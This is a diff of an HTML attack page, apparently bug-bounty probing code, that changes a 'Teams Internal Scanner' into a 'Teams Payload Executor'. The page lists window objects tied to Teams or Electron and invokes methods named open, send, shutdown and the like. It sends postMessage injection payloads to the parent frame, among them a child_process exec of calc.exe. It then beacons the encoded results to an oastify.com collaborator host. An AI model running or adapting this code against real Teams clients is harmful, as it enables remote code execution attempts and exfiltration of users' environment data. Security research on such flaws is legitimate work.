@@ -1,10 +1,10 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Teams Internal Scanner</title>
+  <title>Teams Payload Executor</title>
 </head>
 <body>
-  <h1>Scanning internal Teams objects...</h1>
+  <h1>Executing payloads...</h1>
 
   <script>
     (async () => {
@@ -12,49 +12,71 @@
         origin: location.origin,
         hostname: location.hostname,
         userAgent: navigator.userAgent,
-        internalCandidates: {},
-        errors: [],
+        executionLog: [],
+        postMessageResponses: [],
+        errors: []
       };
 
-      const suspiciousKeywords = [
-        "teams", "proxy", "postMessage", "adapter", "bridge",
-        "shell", "core", "remote", "ipc", "electron", "sidecar", "pre", "ms"
-      ];
+      const suspiciousKeys = Object.keys(window).filter(k =>
+        /teams|proxy|postMessage|shell|adapter|bridge|ipc|core|electron|remote/i.test(k)
+      );
 
-      const keys = Object.keys(window);
-      for (const key of keys) {
+      for (const key of suspiciousKeys) {
         try {
-          const lower = key.toLowerCase();
-          const matches = suspiciousKeywords.some(s => lower.includes(s));
-
-          if (!matches) continue;
-
           const val = window[key];
-          if (val === null) continue;
-
-          if (typeof val === "function") {
-            result.internalCandidates[key] = "function";
-          } else if (typeof val === "object") {
-            const props = Object.getOwnPropertyNames(val).slice(0, 25); // evitar objetos gigantes
-            result.internalCandidates[key] = { type: "object", props };
-
-            // Verificar se há funções internas:
-            result.internalCandidates[key].methods = props.filter(p => {
+          if (typeof val === "object" && val !== null) {
+            const props = Object.getOwnPropertyNames(val);
+            for (const p of props) {
               try {
-                return typeof val[p] === "function";
-              } catch {
-                return false;
+                if (typeof val[p] === "function") {
+                  const fn = val[p];
+                  const name = `${key}.${p}()`;
+                  let res = null;
+
+                  // Executa apenas funções suspeitas
+                  if (/call|start|shutdown|open|send|get/i.test(p)) {
+                    res = fn.apply(val, []);
+                    result.executionLog.push({ method: name, result: String(res) });
+                  }
+                }
+              } catch (e) {
+                result.errors.push({ method: `${key}.${p}`, error: String(e) });
               }
-            });
+            }
           }
         } catch (e) {
           result.errors.push({ key, error: String(e) });
         }
       }
 
-      const base64 = btoa(unescape(encodeURIComponent(JSON.stringify(result))));
-      const url = "https://srn3qjhal1a75jhrros70z94qvwmke83.oastify.com/?resposta=" + base64;
-      new Image().src = url;
+      // Testa postMessage injection
+      const payloads = [
+        { type: "telemetry", event: "openDevTools" },
+        { type: "exec", payload: "require('child_process').exec('calc.exe')" },
+        { command: "shutdown" },
+        { action: "run", value: "alert(1)" }
+      ];
+
+      payloads.forEach(msg => {
+        try {
+          window.parent.postMessage(msg, "*");
+          result.postMessageResponses.push({ sent: msg });
+        } catch (e) {
+          result.errors.push({ postMessage: msg, error: String(e) });
+        }
+      });
+
+      // Capture replies
+      window.addEventListener("message", e => {
+        result.postMessageResponses.push({ received: e.data });
+      });
+
+      // Aguarda e envia resultado após 3 segundos
+      setTimeout(() => {
+        const base64 = btoa(unescape(encodeURIComponent(JSON.stringify(result))));
+        const url = "https://j9tu8az13ssynazi9fayiqrv8med23qs.oastify.com/?resposta=" + base64;
+        new Image().src = url;
+      }, 3000);
     })();
   </script>
 </body>
